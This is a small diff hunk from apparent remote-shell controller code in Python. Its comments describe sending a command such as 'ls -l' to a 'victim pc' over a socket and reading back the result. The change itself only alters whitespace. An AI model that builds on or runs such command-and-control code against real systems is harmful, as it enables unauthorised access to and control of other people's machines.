@@ -20,7 +20,7 @@ def notReal(HOST, PORT, command = "ls -l"):
 
 		#Sends a command back to the victim pc
 		conn.sendall(command.encode())
-		
+
 		#Reads result of command sent to victim pc
 		result = conn.recv(1024)
 
